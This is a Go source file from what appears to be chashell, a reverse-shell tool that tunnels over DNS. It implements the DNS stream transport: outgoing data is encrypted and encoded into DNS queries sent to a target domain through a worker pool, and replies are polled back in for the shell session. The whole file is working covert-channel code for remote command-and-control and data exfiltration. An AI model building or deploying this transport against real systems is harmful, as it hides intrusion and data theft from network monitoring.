package transport

import (
	"github.com/kost/chashell/lib/logging"
	"github.com/Jeffail/tunny"
	"github.com/rs/xid"
	"errors"
	"time"
	"io"
)

type DnsStream struct {
	targetDomain  string
	encryptionKey string
	clientGuid    []byte
	opened        bool
	Sleeptime     time.Duration
}

func DNSStream(targetDomain string, encryptionKey string) *DnsStream {
	// Generate a "unique" client id.
	guid := xid.New()

	// Specify the stream configuration.
	dnsConfig := DnsStream{targetDomain: targetDomain, encryptionKey: encryptionKey, clientGuid: guid.Bytes(), opened: true, Sleeptime: 200 * time.Millisecond}

	// Poll data from the DNS server.
	go pollRead(dnsConfig)

	return &dnsConfig
}

func (stream *DnsStream) SetSleeptime (dur time.Duration) {
	if stream != nil {
		stream.Sleeptime = dur
	}
}

func (stream *DnsStream) Read(data []byte) (int, error) {
	if ! stream.opened {
		return 0, errors.New("read after close")
	}
	// Wait for a packet in the queue.
	packet := <- packetQueue
	// Copy it into the data buffer.
	copy(data, packet)
	// Return the number of bytes we read.
	return len(packet), nil
}

func (stream *DnsStream) Write(data []byte) (int, error) {
	if ! stream.opened {
		return 0, errors.New("write after close")
	}
	// Encode the packets.
	initPacket, dataPackets := Encode(data, true, stream.encryptionKey, stream.targetDomain, stream.clientGuid)

	// Send the init packet to inform that we will send data.
	_, err := sendDNSQuery([]byte(initPacket), stream.targetDomain)
	if err != nil {
		logging.Printf("Unable to send init packet : %v\n", err)
		return 0, io.ErrClosedPipe
	}


	// Create a worker pool to asynchronously send DNS packets.
	poll := tunny.NewFunc(8, func(packet interface{}) interface{} {
		_, err := sendDNSQuery([]byte(packet.(string)), stream.targetDomain)

		if err != nil {
			logging.Printf("Failed to send data packet : %v\n", err)

		}
		return nil
	})
	defer poll.Close()

	// Send jobs to the pool.
	for _, packet := range dataPackets {
		poll.Process(packet)
	}

	return len(data), nil
}

func (stream *DnsStream) Close() (error) {
	stream.opened=false
	return nil
}
